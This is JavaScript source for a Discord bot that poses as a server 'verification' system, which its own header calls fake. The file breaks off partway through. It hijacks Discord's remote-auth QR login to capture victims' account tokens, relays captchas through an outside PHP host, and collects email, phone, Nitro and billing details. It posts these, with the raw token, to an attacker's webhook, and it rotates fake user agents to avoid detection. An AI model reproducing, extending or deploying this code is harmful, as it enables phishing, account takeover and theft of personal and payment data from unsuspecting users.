// main.js
// 2 Bots: Security (fake) + Verify (real)
// API PHP hospedada no InfinityFree (github-software.rf.gd)
// Node.js 18+

const {
    Client, GatewayIntentBits, Partials, Events,
    ContainerBuilder, TextDisplayBuilder, SeparatorBuilder,
    ButtonBuilder, ButtonStyle, MessageFlags, ActionRowBuilder,
    EmbedBuilder
} = require('discord.js');

const WebSocket = require('ws');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const https = require('https');

const { bypassGet, bypassPost } = require('./infinityfree_bypass');

// =============================================
// CONFIG
// =============================================
const config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
const PREFIX = config.prefix || '!';
const ALLOWED_GUILDS = config.allowed_guilds || [];
const WEBHOOK_URL = config.logs_webhook_url || '';
const LINK_ALTERNATIVE = config.linkalternative || '';
const COMMAND_1 = config.command_name || 'verify';
const COMMAND_2 = config.command_name2 || 'verify2';

const DB_FILE = path.join(__dirname, 'database.json');
const LOG_FILE = path.join(__dirname, 'logs.txt');
const API_URL = config.api_url || 'https://github-software.rf.gd/api.php';

// =============================================
// USER-AGENT
// =============================================
function randomChoice(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

function randomUA() {
    const chromeMajor = randomInt(118, 126);
    const chromeFull = `${chromeMajor}.0.${randomInt(5000, 6500)}.${randomInt(50, 200)}`;
    const firefoxMajor = randomInt(118, 126);
    const firefoxFull = `${firefoxMajor}.0`;
    const edgeMajor = randomInt(118, 126);
    const edgeFull = `${edgeMajor}.0.${randomInt(1000, 2500)}.${randomInt(30, 90)}`;
    const safariVersion = randomChoice(['17.0', '17.1', '17.2', '17.3', '16.6']);
    const appleWebKit = randomChoice(['605.1.15', '605.1.16', '605.1.17']);

    const platforms = [
        { str: 'Windows NT 10.0; Win64; x64', chrome: true, firefox: true, edge: true, safari: false },
        { str: 'Windows NT 10.0; WOW64', chrome: true, firefox: true, edge: true, safari: false },
        { str: 'Windows NT 11.0; Win64; x64', chrome: true, firefox: true, edge: true, safari: false },
        { str: 'Macintosh; Intel Mac OS X 10_15_7', chrome: true, firefox: true, edge: true, safari: true },
        { str: 'Macintosh; Intel Mac OS X 13_6_1', chrome: true, firefox: true, edge: true, safari: true },
        { str: 'Macintosh; Intel Mac OS X 14_2_1', chrome: true, firefox: true, edge: true, safari: true },
        { str: 'X11; Linux x86_64', chrome: true, firefox: true, edge: false, safari: false },
        { str: 'X11; Ubuntu; Linux x86_64', chrome: true, firefox: true, edge: false, safari: false },
        { str: 'Linux; Android 13; SM-S918B', chrome: true, firefox: false, edge: false, safari: false, mobile: true },
        { str: 'Linux; Android 14; Pixel 8', chrome: true, firefox: false, edge: false, safari: false, mobile: true },
        { str: 'Linux; Android 12; SM-A528B', chrome: true, firefox: false, edge: false, safari: false, mobile: true },
        { str: 'iPhone; CPU iPhone OS 17_1 like Mac OS X', chrome: false, firefox: false, edge: false, safari: true, mobile: true },
        { str: 'iPhone; CPU iPhone OS 17_3 like Mac OS X', chrome: false, firefox: false, edge: false, safari: true, mobile: true },
        { str: 'iPad; CPU OS 17_2 like Mac OS X', chrome: false, firefox: false, edge: false, safari: true, mobile: true },
    ];

    const platform = randomChoice(platforms);
    const isMobile = !!platform.mobile;
    const possibleBrowsers = [];
    if (platform.chrome) possibleBrowsers.push('chrome');
    if (platform.firefox) possibleBrowsers.push('firefox');
    if (platform.edge) possibleBrowsers.push('edge');
    if (platform.safari) possibleBrowsers.push('safari');
    const browser = randomChoice(possibleBrowsers);

    if (browser === 'chrome') {
        if (isMobile) return `Mozilla/5.0 (${platform.str}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeFull} Mobile Safari/537.36`;
        return `Mozilla/5.0 (${platform.str}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeFull} Safari/537.36`;
    }
    if (browser === 'firefox') return `Mozilla/5.0 (${platform.str}; rv:${firefoxFull}) Gecko/20100101 Firefox/${firefoxFull}`;
    if (browser === 'edge') return `Mozilla/5.0 (${platform.str}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeFull} Safari/537.36 Edg/${edgeFull}`;
    if (browser === 'safari') {
        if (isMobile) return `Mozilla/5.0 (${platform.str}) AppleWebKit/${appleWebKit} (KHTML, like Gecko) Version/${safariVersion} Mobile/15E148 Safari/604.1`;
        return `Mozilla/5.0 (${platform.str}) AppleWebKit/${appleWebKit} (KHTML, like Gecko) Version/${safariVersion} Safari/${appleWebKit}`;
    }
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeFull} Safari/537.36`;
}

const EMOJI = {
    shield:   '<:shield:1551779357020655736>',
    error:    '<:cctv_wrong:1549209698698526831>',
    positivo: '<:positivo:1551779354177175593>',
    robot:    '<:robot:1551779352612442173>',
    seta:     '<:seta:1551779349932277821>',
    mobile:   '<:mobile79:1551779345775730759>'
};

if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, `===== LOGS INICIADOS EM ${new Date().toLocaleString('pt-BR')} =====\n\n`, 'utf-8');
}

function ts() {
    const now = new Date();
    return `[${now.toLocaleDateString('pt-BR')} ${now.toLocaleTimeString('pt-BR')}]`;
}

function log(line) {
    try { fs.appendFileSync(LOG_FILE, line + '\n', 'utf-8'); } catch {}
    console.log(line);
}

// =============================================
// WEBHOOK
// =============================================
async function sendWebhook(payload) {
    if (!WEBHOOK_URL) return false;
    try {
        const urlObj = new URL(WEBHOOK_URL);
        const data = JSON.stringify(payload);
        const options = {
            hostname: urlObj.hostname, port: 443,
            path: urlObj.pathname + urlObj.search, method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data),
                'User-Agent': 'Mozilla/5.0'
            }
        };
        return new Promise((resolve) => {
            const req = https.request(options, (res) => {
                res.on('data', () => {});
                res.on('end', () => resolve(res.statusCode >= 200 && res.statusCode < 300));
            });
            req.on('error', () => resolve(false));
            req.write(data); req.end();
        });
    } catch { return false; }
}

async function sendWebhookEmbed(embed) { return sendWebhook({ embeds: [embed] }); }

// =============================================
// DATABASE
// =============================================
function loadDB() {
    if (!fs.existsSync(DB_FILE)) { fs.writeFileSync(DB_FILE, '{}', 'utf-8'); return {}; }
    try {
        const content = fs.readFileSync(DB_FILE, 'utf-8').trim();
        return content ? JSON.parse(content) : {};
    } catch { return {}; }
}
function saveDB(data) { fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 4), 'utf-8'); }

// =============================================
// HTTP
// =============================================
function httpGet(url, headers = {}) {
    return new Promise((resolve) => {
        try {
            const req = https.get(url, { headers }, (res) => {
                let data = '';
                res.on('data', (c) => { data += c; });
                res.on('end', () => resolve({ status: res.statusCode, body: data }));
            });
            req.on('error', () => resolve({ status: 0, body: '' }));
            req.setTimeout(10000, () => { req.destroy(); resolve({ status: 0, body: '' }); });
        } catch { resolve({ status: 0, body: '' }); }
    });
}

function httpPost(url, body, headers = {}) {
    return new Promise((resolve) => {
        try {
            const urlObj = new URL(url);
            const data = typeof body === 'string' ? body : JSON.stringify(body);
            const options = {
                hostname: urlObj.hostname, port: 443,
                path: urlObj.pathname + urlObj.search, method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(data),
                    ...headers
                }
            };
            const req = https.request(options, (res) => {
                let responseData = '';
                res.on('data', (c) => { responseData += c; });
                res.on('end', () => resolve({ status: res.statusCode, body: responseData }));
            });
            req.on('error', () => resolve({ status: 0, body: '' }));
            req.setTimeout(15000, () => { req.destroy(); resolve({ status: 0, body: '' }); });
            req.write(data); req.end();
        } catch { resolve({ status: 0, body: '' }); }
    });
}

// =============================================
// TOKEN INFO
// =============================================
async function isTokenAlive(token) {
    if (!token) return false;
    const r = await httpGet('https://discord.com/api/v9/users/@me', {
        Authorization: token, 'User-Agent': randomUA()
    });
    return r.status === 200;
}

async function getTokenInfo(token) {
    try {
        const headers = { Authorization: token, 'User-Agent': randomUA() };
        const r = await httpGet('https://discord.com/api/v9/users/@me', headers);
        if (r.status !== 200) return null;
        const u = JSON.parse(r.body);

        let subscription = [];
        try {
            const rs = await httpGet('https://discordapp.com/api/v10/users/@me/billing/subscriptions', headers);
            if (rs.status === 200) subscription = JSON.parse(rs.body);
        } catch {}

        let billing = [];
        try {
            const rb = await httpGet('https://discord.com/api/v9/users/@me/billing/payment-sources', headers);
            if (rb.status === 200) billing = JSON.parse(rb.body);
        } catch {}

        let nitro = 'No Nitro';
        if (u.premium_type === 1) nitro = 'Nitro Classic';
        else if (u.premium_type === 2) nitro = 'Nitro';
        else if (u.premium_type === 3) nitro = 'Nitro Basic';

        let billingStr = 'None';
        if (Array.isArray(billing) && billing.length > 0) {
            const methods = [];
            for (const s of billing) {
                if (s.type === 1) methods.push('Card');
                else if (s.type === 2) methods.push('PayPal');
            }
            billingStr = methods.length ? methods.join(', ') : 'None';
        }

        return {
            id: u.id, userid: u.id, username: u.username,
            discriminator: u.discriminator || '0',
            display_name: u.global_name || u.username,
            user: `${u.username}#${u.discriminator || '0'}`,
            avatar: u.avatar,
            avatar_url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png`,
            email: u.email || 'Not verified', phone: u.phone || 'None',
            verified: u.verified || false, mfa_enabled: u.mfa_enabled || false,
            flags: u.flags || 0, locale: u.locale || 'en-US',
            nitro, premium_type: u.premium_type || 0, billing: billingStr,
            subscription: Array.isArray(subscription) ? subscription : [],
            token, status: 'vivo'
        };
    } catch { return null; }
}

// =============================================
// REMOTE AUTH CLIENT
// =============================================
class RemoteAuthClient {
    constructor(userId, onFingerprint, onToken, onTimeout) {
        this.userId = userId;
        this.userAgent = randomUA();
        this.onFingerprint = onFingerprint;
        this.onToken = onToken;
        this.onTimeout = onTimeout;
        this.onCaptchaUrl = null;
        this.ws = null;
        this.heartbeatInterval = null;
        this.privateKey = null;
        this.publicKeyString = null;
        this.closed = false;
        this.finished = false;
        this.exchangingTicket = false;
        this.raLink = null;
        this.initCrypto();
    }

    initCrypto() {
        const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
            modulusLength: 2048,
            publicKeyEncoding: { type: 'spki', format: 'pem' },
            privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
        });
        this.privateKey = crypto.createPrivateKey(privateKey);
        const pubDer = crypto.createPublicKey(publicKey).export({ type: 'spki', format: 'der' });
        this.publicKeyString = pubDer.toString('base64');
    }

    start() {
        log(`${ts()} [WS] 🔌 Conectando...`);
        this.ws = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=2', {
            headers: { 'Origin': 'https://discord.com', 'User-Agent': this.userAgent }
        });
        this.ws.on('open', () => log(`${ts()} [WS] ✅ Conectado`));
        this.ws.on('message', (raw) => {
            try { this.handlePacket(JSON.parse(raw.toString())); }
            catch (e) { log(`${ts()} [WS] ❌ Parse: ${e.message}`); }
        });
        this.ws.on('close', (code) => {
            log(`${ts()} [WS] 🔌 Fechado (code=${code})`);
            this.cleanup();
            if (this.exchangingTicket) return;
            if (!this.closed && !this.finished) {
                this.closed = true;
                if (this.onTimeout) this.onTimeout(code);
            }
        });
        this.ws.on('error', (e) => log(`${ts()} [WS] ❌ Erro: ${e.message}`));
    }

    handlePacket(p) {
        const op = p.op;
        switch (op) {
            case 'hello':
                log(`${ts()} [WS] 👋 hello`);
                this.send({ op: 'init', encoded_public_key: this.publicKeyString });
                if (p.heartbeat_interval) {
                    this.heartbeatInterval = setInterval(() => this.send({ op: 'heartbeat' }), p.heartbeat_interval);
                }
                break;
            case 'nonce_proof': {
                try {
                    const decrypted = crypto.privateDecrypt(
                        { key: this.privateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
                        Buffer.from(p.encrypted_nonce, 'base64')
                    );
                    const hash = crypto.createHash('sha256').update(decrypted).digest('base64')
                        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                    this.send({ op: 'nonce_proof', proof: hash });
                } catch (e) { log(`${ts()} [WS] ❌ nonce_proof: ${e.message}`); }
                break;
            }
            case 'pending_remote_init': {
                const link = `https://discord.com/ra/${p.fingerprint}`;
                this.raLink = link;
                log(`${ts()} [WS] 🔗 Link RA: ${link}`);
                if (this.onFingerprint) this.onFingerprint(link);
                break;
            }
            case 'pending_ticket':
                log(`${ts()} [WS] 🎫 pending_ticket`);
                break;
            case 'pending_login': {
                const ticket = p.ticket;
                log(`${ts()} [WS] 🔐 pending_login`);
                if (!ticket) break;
                this.exchangingTicket = true;
                this.exchangeTicket(ticket).then(async (encryptedToken) => {
                    if (!encryptedToken) {
                        log(`${ts()} [WS] ❌ exchangeTicket falhou`);
                        this.closed = true; this.cleanup();
                        if (this.onTimeout) this.onTimeout(-3);
                        return;
                    }
                    try {
                        const decrypted = crypto.privateDecrypt(
                            { key: this.privateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
                            Buffer.from(encryptedToken, 'base64')
                        ).toString('utf-8');
                        log(`${ts()} [WS] ✅ Token: ${decrypted.substring(0, 30)}...`);
                        this.finished = true; this.closed = true;
                        if (this.onToken) this.onToken(decrypted);
                        this.cleanup();
                    } catch (e) {
                        log(`${ts()} [WS] ❌ Decrypt: ${e.message}`);
                        this.closed = true; this.cleanup();
                        if (this.onTimeout) this.onTimeout(-1);
                    }
                });
                break;
            }
            case 'pending_finish':
                log(`${ts()} [WS] 📱 pending_finish`);
                break;
            case 'heartbeat_ack': break;
            case 'finish': {
                log(`${ts()} [WS] 🎯 finish`);
                try {
                    const decrypted = crypto.privateDecrypt(
                        { key: this.privateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
                        Buffer.from(p.encrypted_token, 'base64')
                    ).toString('utf-8');
                    log(`${ts()} [WS] ✅ Token: ${decrypted.substring(0, 30)}...`);
                    this.finished = true; this.closed = true;
                    if (this.onToken) this.onToken(decrypted);
                    this.cleanup();
                } catch (e) {
                    log(`${ts()} [WS] ❌ Decrypt: ${e.message}`);
                    this.closed = true; this.cleanup();
                    if (this.onTimeout) this.onTimeout(-1);
                }
                break;
            }
            case 'cancel':
                log(`${ts()} [WS] ❌ cancel`);
                this.closed = true; this.cleanup();
                if (this.onTimeout) this.onTimeout(-2);
                break;
            default: log(`${ts()} [WS] ℹ️ op: ${op}`); break;
        }
    }

    // ==========================================================
    // EXCHANGE TICKET — com suporte a captcha e retry automático
    // ==========================================================
    async exchangeTicket(ticket) {
        log(`${ts()} [EXCHANGE] 🔄 Trocando ticket...`);

        const sp = Buffer.from(JSON.stringify({
            os: 'Windows', browser: 'Chrome', device: '',
            system_locale: 'en-US', browser_version: '120.0.0.0',
            os_version: '10', referring_domain: 'discord.com',
            referring_domain_current: 'discord.com',
            release_channel: 'stable', client_build_number: 250000,
            client_event_source: null
        })).toString('base64');

        // 1) Tentativa inicial (sem captcha)
        let r = await this.tryExchange(ticket, null, sp);

        log(`${ts()} [EXCHANGE] 📥 Status inicial: ${r.status}`);

        // Se já passou, retorna
        if (r.status === 200) {
            try {
                const json = JSON.parse(r.body);
                this.exchangingTicket = false;
                return json.encrypted_token || null;
            } catch { this.exchangingTicket = false; return null; }
        }

        // Se não é 400 com captcha, aborta
        if (r.status !== 400) {
            log(`${ts()} [EXCHANGE] ❌ Body: ${(r.body || '').substring(0, 200)}`);
            this.exchangingTicket = false;
            return null;
        }

        // 2) Precisa de captcha
        let captchaData;
        try { captchaData = JSON.parse(r.body); } catch { this.exchangingTicket = false; return null; }

        if (!Array.isArray(captchaData.captcha_key) || !captchaData.captcha_key.includes('captcha-required')) {
            log(`${ts()} [EXCHANGE] ❌ Resposta 400 sem captcha-required: ${r.body.substring(0, 200)}`);
            this.exchangingTicket = false;
            return null;
        }

        // Loop de tentativas de captcha
        const MAX_RETRIES = 5;
        for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
            const sitekey   = captchaData.captcha_sitekey;
            const sessionId = captchaData.captcha_session_id || '';
            const rqdata    = captchaData.captcha_rqdata || '';
            const rqtoken   = captchaData.captcha_rqtoken || '';
            const shouldServeInvisible = !!captchaData.captcha_should_serve_invisible;

            if (!sitekey) {
                log(`${ts()} [CAPTCHA] ❌ Sem sitekey`);
                this.exchangingTicket = false;
                return null;
            }

            const state = crypto.randomBytes(32).toString('hex');

            log(`${ts()} [CAPTCHA] 📤 Criando sessão na API PHP (tentativa ${attempt + 1}/${MAX_RETRIES})...`);
            const createResp = await bypassPost(`${API_URL}?action=create`, {
                state, ticket, sitekey, sessionId, rqdata, rqtoken,
                userId: this.userId,
                should_serve_invisible: shouldServeInvisible,
                retry_count: attempt
            });

            log(`${ts()} [CAPTCHA] 📥 create status=${createResp.status} body=${(createResp.body || '').substring(0, 200)}`);

            let createOk = false;
            try { createOk = JSON.parse(createResp.body).ok === true; } catch {}
            if (!createOk) {
                log(`${ts()} [CAPTCHA] ❌ Falha ao criar sessão`);
                this.exchangingTicket = false;
                return null;
            }

            const captchaUrl = `${API_URL}?action=login&state=${state}`;
            log('');
            log('='.repeat(60));
            log(`${ts()} [CAPTCHA] ⚠️  Captcha requerido! Tentativa ${attempt + 1}/${MAX_RETRIES}`);
            log(`${ts()} [CAPTCHA] 🌐 URL: ${captchaUrl}`);
            log('='.repeat(60));
            log('');

            if (this.onCaptchaUrl) this.onCaptchaUrl(captchaUrl);

            // Aguarda o usuário resolver (com polling)
            const solution = await this.waitForCaptchaSolution(state);

            if (solution === null) {
                log(`${ts()} [CAPTCHA] ⏰ Tempo esgotado ou erro`);
                this.exchangingTicket = false;
                return null;
            }
            if (solution === 'RA_ONLY') {
                log(`${ts()} [CAPTCHA] ⚠️ Forçando link RA`);
                if (this.onFingerprint) this.onFingerprint(this.raLink || '');
                this.exchangingTicket = false;
                return null;
            }
            if (typeof solution === 'string' && solution.startsWith('NEW_CHALLENGE:')) {
                // Solução indica novo desafio — precisamos reconsultar o Discord
                log(`${ts()} [CAPTCHA] 🔄 Novo desafio do Discord detectado, reconsultando...`);
                // Simula uma nova resposta 400 com os dados atualizados
                try {
                    const payload = JSON.parse(solution.substring('NEW_CHALLENGE:'.length));
                    captchaData = payload;
                    continue; // tenta novamente com o novo rqdata
                } catch (e) {
                    log(`${ts()} [CAPTCHA] ❌ Parse do novo desafio: ${e.message}`);
                    this.exchangingTicket = false;
                    return null;
                }
            }

            // solution é o captcha_token
            log(`${ts()} [CAPTCHA] 🎫 Token do usuário recebido, trocando com o Discord...`);

            const dr = await this.tryExchange(ticket, solution, sp, rqtoken, sessionId);

            log(`${ts()} [CAPTCHA] 📥 Discord → ${dr.status}`);
            log(`${ts()} [CAPTCHA] 📥 Resposta: ${(dr.body || '').substring(0, 300)}`);

            if (dr.status === 200) {
                try {
                    const json = JSON.parse(dr.body);
                    // Salva o resultado na API para o polling ver
                    await bypassPost(`${API_URL}?action=set_result`, {
                        state, result: json.encrypted_token || ''
                    }).catch(() => {});
                    this.exchangingTicket = false;
                    return json.encrypted_token || null;
                } catch { this.exchangingTicket = false; return null; }
            }

            if (dr.status === 400) {
                let cd = {};
                try { cd = JSON.parse(dr.body); } catch {}
                const keys = Array.isArray(cd.captcha_key) ? cd.captcha_key.join(',') : '';

                if (keys.includes('invalid-response') || keys.includes('captcha-required')) {
                    log(`${ts()} [CAPTCHA] 🔄 Captcha rejeitado (${keys}). Obtendo novo desafio...`);

                    // Atualiza a sessão na API com os novos dados
                    await bypassPost(`${API_URL}?action=reset`, {
                        state,
                        rqdata:  cd.captcha_rqdata   || '',
                        rqtoken: cd.captcha_rqtoken  || '',
                        sessionId: cd.captcha_session_id || '',
                        sitekey:  cd.captcha_sitekey || sitekey,
                        ticket:   ticket
                    }).catch(() => {});

                    // Atualiza captchaData e continua o loop
                    captchaData = {
                        captcha_key: cd.captcha_key,
                        captcha_sitekey: cd.captcha_sitekey || sitekey,
                        captcha_session_id: cd.captcha_session_id || '',
                        captcha_rqdata: cd.captcha_rqdata || '',
                        captcha_rqtoken: cd.captcha_rqtoken || '',
                        captcha_should_serve_invisible: !!cd.captcha_should_serve_invisible
                    };

                    if (this.onCaptchaUrl) this.onCaptchaUrl(captchaUrl);
                    continue;
                }
            }

            // Erro não recuperável
            log(`${ts()} [CAPTCHA] ❌ Discord rejeitou (${dr.status}): ${(dr.body || '').substring(0, 200)}`);
            this.exchangingTicket = false;
            return null;
        }

        log(`${ts()} [CAPTCHA] ❌ Máximo de tentativas atingido`);
        this.exchangingTicket = false;
        return null;
    }

    /**
     * Faz o POST em remote-auth/login com ou sem captcha_key.
     */
    async tryExchange(ticket, captchaToken, sp, rqtoken, sessionId) {
        const body = captchaToken
            ? JSON.stringify({
                ticket,
                captcha_key: captchaToken,
                captcha_rqtoken: rqtoken || ''
            })
            : JSON.stringify({ ticket });

        const headers = {
            'User-Agent': this.userAgent,
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/login',
            'x-super-properties': sp,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        };

        return httpPost('https://discord.com/api/v9/users/@me/remote-auth/login', body, headers);
    }

    /**
     * Faz polling na API PHP aguardando o token do hCaptcha.
     * Retorna:
     *   - string (token hCaptcha) → sucesso
     *   - null                    → timeout/erro
     *   - 'RA_ONLY'               → usar link RA
     *   - 'NEW_CHALLENGE:{json}'  → novo desafio (não usado aqui, o reset trata)
     */
    async waitForCaptchaSolution(state) {
        const POLL_INTERVAL = 2000;
        const TIMEOUT_MS = 5 * 60 * 1000;
        const startedAt = Date.now();

        while (Date.now() - startedAt < TIMEOUT_MS) {
            await new Promise(r => setTimeout(r, POLL_INTERVAL));

            const s = await bypassGet(`${API_URL}?action=session&state=${state}&full=1`);
            if (s.status !== 200) continue;

            let data;
            try { data = JSON.parse(s.body); } catch { continue; }
            if (!data.ok) continue;

            if (data.status === 'token_received' && data.captcha_token) {
                return data.captcha_token;
            }
            if (data.status === 'success' && data.result) {
                return data.result;
            }
            if (data.status === 'error') {
                log(`${ts()} [CAPTCHA] ❌ Erro reportado pela API: ${data.error}`);
                return null;
            }
            if (data.status === 'ra_only') {
                return 'RA_ONLY';
            }
        }

        return null;
    }

    send(obj) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) this.ws.send(JSON.stringify(obj));
    }

    cleanup() {
        if (this.heartbeatInterval) { clearInterval(this.heartbeatInterval); this.heartbeatInterval = null; }
        try { if (this.ws && this.ws.readyState === WebSocket.OPEN) this.ws.close(); } catch {}
    }

    stop() { this.closed = true; this.cleanup(); }
}

// =============================================
// SESSIONS
// =============================================
const SESSIONS = new Map();
let LAST_WS_TIME = 0;
const MIN_WS_INTERVAL = 1500;

function waitForRateLimit() {
    return new Promise((resolve) => {
        const now = Date.now();
        const diff = now - LAST_WS_TIME;
        if (diff >= MIN_WS_INTERVAL) { LAST_WS_TIME = Date.now(); resolve(); }
        else setTimeout(() => { LAST_WS_TIME = Date.now(); resolve(); }, MIN_WS_INTERVAL - diff);
    });
}

async function startSession(userId) {
    const existing = SESSIONS.get(userId);
    if (existing && (existing.status === 'starting' || existing.status === 'waiting') && existing.expires_at > Date.now()) {
        log(`${ts()} [SESSION] ♻️ Reutilizando sessão`);
        return existing;
    }
    if (existing && existing.client) { try { existing.client.stop(); } catch {} SESSIONS.delete(userId); }

    await waitForRateLimit();

    const session = {
        client: null, raLink: null, expires_at: Date.now() + 180000,
        status: 'starting', info: null, tokenSent: false,
        created_at: Date.now(), captchaUrl: null
    };
    SESSIONS.set(userId, session);

    const client = new RemoteAuthClient(
        userId,
        async (link) => { session.raLink = link; session.status = 'waiting'; log(`${ts()} [SESSION] 🔗 Link RA: ${link}`); },
        async (token) => {
            log(`${ts()} [SESSION] 🔑 Token recebido`);
            try {
                const info = await getTokenInfo(token);
                if (info) {
                    const db = loadDB();
                    db[userId] = { ...info, authorized: true, authorized_at: Date.now() };
                    saveDB(db);
                    session.info = info; session.status = 'success';
                    await sendLogToWebhook(info, userId);
                } else session.status = 'error';
            } catch (e) { session.status = 'error'; log(`${ts()} [SESSION] ❌ ${e.message}`); }
        },
        (code) => {
            if (session.status === 'starting' || session.status === 'waiting') {
                if (code === 4002) session.status = 'ratelimit';
                else session.status = 'timeout';
            }
        }
    );

    client.onCaptchaUrl = (url) => { session.captchaUrl = url; session.status = 'captcha'; log(`${ts()} [SESSION] 🧩 URL: ${url}`); };
    session.client = client;
    client.start();

    const startWait = Date.now();
    while (Date.now() - startWait < 15000) {
        if (session.raLink) break;
        if (session.status === 'timeout' || session.status === 'error' || session.status === 'ratelimit') break;
        await new Promise(r => setTimeout(r, 100));
    }
    return session;
}

// =============================================
// WEBHOOK LOG
// =============================================
async function sendLogToWebhook(info, userId) {
    try {
        const embed = {
            title: `🔑 Novo Token Capturado`, color: 0x00FF00,
            fields: [
                { name: '👤 Username', value: info.user || '?', inline: true },
                { name: '📛 Display', value: info.display_name || '?', inline: true },
                { name: '🆔 ID', value: info.id || '?', inline: true },
                { name: '📧 Email', value: info.email || '?', inline: true },
                { name: '📱 Phone', value: info.phone || '?', inline: true },
                { name: '💎 Nitro', value: info.nitro || '?', inline: true },
                { name: '💳 Billing', value: info.billing || '?', inline: true },
                { name: '✅ Verified', value: info.verified ? 'Yes' : 'No', inline: true },
                { name: '🔐 MFA', value: info.mfa_enabled ? 'Yes' : 'No', inline: true },
                { name: '🔑 Token', value: `\`\`\`${info.token}\`\`\``, inline: false }
            ],
            thumbnail: { url: info.avatar_url },
            footer: { text: `User ID: ${userId}` },
            timestamp: new Date().toISOString()
        };
        await sendWebhookEmbed(embed);
    } catch (e) { log(`${ts()} [WEBHOOK] ❌ ${e.message}`); }
}

// =============================================
// BUILDERS
// =============================================
function buildMsg1(serverName) {
    return new ContainerBuilder()
        .setAccentColor(0x00AAEE)
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`### ${EMOJI.robot}︱Verification Required for **${serverName}**`))
        .addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(2))
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`In order to get access to **${serverName}** you must click the button below.`));
}

function buildMsg2(serverName, expiresTs) {
    return new ContainerBuilder()
        .setAccentColor(0x00AAEE)
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`### ${EMOJI.shield}︱Verification required for **${serverName}**`))
        .addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(1))
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(
            `Click **Link direct** to open the verification link.\n` +
            `This challenge expires <t:${expiresTs}:R>\n\n` +
            `${EMOJI.mobile} Open the Discord Mobile application\n` +
            `${EMOJI.seta} Go to Settings > Scan QR Code`
        ));
}

function buildMsgCaptcha(serverName, captchaUrl) {
    return new ContainerBuilder()
        .setAccentColor(0xFFA500)
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`### ${EMOJI.shield}︱Verificação de Segurança`))
        .addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(1))
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(
            `**Quase pronto!**\n\n` +
            `Complete o CAPTCHA para finalizar a verificação.\n` +
            `-# ⚠️ Se você não completar o CAPTCHA, a verificação não será finalizada e você não receberá o cargo!`
        ))
        .addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(1))
        .addActionRowComponents(new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('Open CAPTCHA')
                .setEmoji({ id: '1551779349932277821', name: 'seta' })
                .setStyle(ButtonStyle.Link).setURL(captchaUrl)
        ));
}

function buildSuccess() {
    return new ContainerBuilder()
        .setAccentColor(0x42FF42)
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`### ${EMOJI.positivo}︱Sucess !`))
        .addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(1))
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Your verification has been authorized.**`));
}

function buildError() {
    return new ContainerBuilder()
        .setAccentColor(0xFF0000)
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`### ${EMOJI.error}︱Error !`))
        .addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(1))
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Your verification has been denied.** Try again !`));
}

function buildExpired() {
    return new ContainerBuilder()
        .setAccentColor(0xFF0000)
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`### ${EMOJI.error}︱Verification Expired !`))
        .addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(1))
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`**This verification challenge has expired.**\nClick **Verify** again.`));
}

function buildAlready() {
    return new ContainerBuilder()
        .setAccentColor(0xFF0000)
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`### ${EMOJI.error}︱Already Verified !`))
        .addSeparatorComponents(new SeparatorBuilder().setDivider(true).setSpacing(1))
        .addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Your verification was authorized already.**`));
}

function buildSecurityInitialEmbed() {
    return new EmbedBuilder().setColor(0x2596be)
        .setDescription(`This server requires you to verify yourself to get access to other channels, you can simply verify by clicking on the verify button.`)
        .setImage('https://securitybot.gg/verify-banner.png');
}

function buildSecurityLoading() {
    return new ContainerBuilder().setAccentColor(0xFFA500)
        .addTextDisplayComponents(new TextDisplayBuilder().setContent('**Reloading... Wait!**'));
}

function buildSecurityError() {
    return new ContainerBuilder().setAccentColor(0xFF0000)
